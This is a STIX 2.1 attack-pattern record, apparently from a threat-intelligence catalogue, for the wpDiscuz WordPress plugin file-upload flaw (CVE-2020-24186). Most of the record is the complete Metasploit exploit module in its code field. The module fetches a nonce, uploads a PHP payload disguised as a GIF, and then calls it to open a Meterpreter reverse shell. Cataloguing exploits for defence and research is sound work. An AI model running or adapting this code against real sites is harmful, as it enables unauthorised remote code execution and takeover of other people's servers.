{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2d50d82-eef2-4f3c-9ecd-effe2bcce798",
    "created": "2024-08-14T17:12:15.690924Z",
    "modified": "2024-08-14T17:12:15.690928Z",
    "name": "WordPress wpDiscuz Unauthenticated File Upload Vulnerability",
    "description": " This module exploits an arbitrary file upload in the WordPress wpDiscuz plugin versions >= `7.0.0` and <= `7.0.4`. This flaw gave unauthenticated attackers the ability to upload arbitrary files, including PHP files, and achieve remote code execution on a vulnerable site\u2019s server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload.rb",
            "external_id": "wp_wpdiscuz_unauthenticated_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-24186"
        },
        {
            "source_name": "WPVDB",
            "external_id": "10333"
        },
        {
            "source_name": "reference",
            "url": "https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/suncsr/wpDiscuz_unauthenticated_arbitrary_file_upload/blob/main/README.md"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/2345429/wpdiscuz"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress wpDiscuz Unauthenticated File Upload Vulnerability',\n        'Description' => %q{\n          This module exploits an arbitrary file upload in the WordPress wpDiscuz plugin\n          versions >= `7.0.0` and <= `7.0.4`. This flaw gave unauthenticated attackers the ability\n          to upload arbitrary files, including PHP files, and achieve remote code execution on a\n          vulnerable site\u2019s server.\n        },\n        'Author' => [\n          'Chloe Chamberland', # Vulnerability Discovery, initial msf module\n          'Hoa Nguyen - SunCSR'  # Metasploit Module enhancement\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-24186'],\n          ['WPVDB', '10333'],\n          ['URL', 'https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/'],\n          ['URL', 'https://github.com/suncsr/wpDiscuz_unauthenticated_arbitrary_file_upload/blob/main/README.md'],\n          ['URL', 'https://plugins.trac.wordpress.org/changeset/2345429/wpdiscuz']\n        ],\n        'Privileged' => false,\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['wpDiscuz < 7.0.5', {}]],\n        'DisclosureDate' => '2020-02-21',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n      )\n\n    register_options [\n      OptString.new('BLOGPATH', [true, 'Link to the post [/index.php/2020/12/12/post1]', nil]),\n    ]\n  end\n\n  def check\n    check_plugin_version_from_readme('wpdiscuz', '7.0.5', '7.0.0')\n  end\n\n  def blogpath\n    datastore['BLOGPATH']\n  end\n\n  def find_wmusecurity_id\n    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, blogpath) })\n    fail_with(Failure::UnexpectedReply, 'Failed to access blog page') unless res\n\n    wmusecurity_id = res.body.match(/wmuSecurity\":\"(\\w+)/)&.captures\n    unless wmusecurity_id\n      fail_with(Failure::NotFound, 'Failed to retrieve the wmusecurity id')\n    end\n\n    wmusecurity_id\n  end\n\n  def exploit\n    wmusecurity_id = find_wmusecurity_id[0]\n    php_page_name = \"#{rand_text_alpha(5..12)}.php\"\n    data = Rex::MIME::Message.new\n    data.add_part('wmuUploadFiles', nil, nil, 'form-data; name=\"action\"')\n    data.add_part(wmusecurity_id, nil, nil, 'form-data; name=\"wmu_nonce\"')\n    data.add_part('undefined', nil, nil, 'form-data; name=\"wmuAttachmentsData\"')\n    data.add_part('1', nil, nil, 'form-data; name=\"postId\"')\n    data.add_part(\"GIF8#{payload.encoded}\", 'image/gif', nil, \"form-data; name=\\\"wmu_files[0]\\\"; filename=\\\"#{php_page_name}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => post_data\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Server did not respond') unless res\n    unless res.code == 200 && res.body =~ /#{php_page_name}/\n      fail_with(Failure::UnexpectedReply, 'Unable to deploy payload')\n    end\n\n    json_data = JSON.parse(res.body)\n    upload_url = json_data.dig('data', 'previewsData', 'images', 0, 'url')\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Upload was unsuccessful\") unless upload_url\n    wp_shell_upload = upload_url.split('/').last\n    fail_with(Failure::NotFound, \"#{peer} - Path not found in response body\") unless wp_shell_upload.ends_with?('.php')\n    print_good(\"Payload uploaded as #{php_page_name}\")\n    register_file_for_cleanup(php_page_name)\n\n    print_status('Calling payload...')\n    time = Time.new\n    year = time.year.to_s\n    month = format('%02d', time.month)\n    send_request_cgi(\n      { 'uri' => normalize_uri(wordpress_url_wp_content, 'uploads', year.to_s, month.to_s, wp_shell_upload) }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-21",
    "x_mitre_platforms": [
        "php'"
    ]
}